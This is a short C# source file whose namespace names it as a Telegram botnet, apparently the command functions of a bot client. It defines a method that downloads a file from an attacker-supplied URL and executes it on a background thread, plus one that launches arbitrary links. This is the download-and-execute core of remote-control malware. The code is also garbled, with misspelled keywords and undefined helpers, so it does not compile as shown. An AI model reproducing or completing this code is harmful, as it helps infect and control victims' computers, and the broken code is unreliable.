using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespase telegraph_botnet_yt
{ 
	class functions
	{
		public static void OpenLink(string URI)
		{
			if(URI.StartWitch("http"))
			{
				Thread thr = new Thread(() => { Process.Start(URI); });
				thr.Start();
			}
		}

		public static void DonwloadExecute(string URI)
		{
			Thread thr = new Thread(() => 
			{ 
				string file_path = web.DownloadFile(URI);
				Process.Start(file_path);
			});

			thr.Start();
		}
	}
}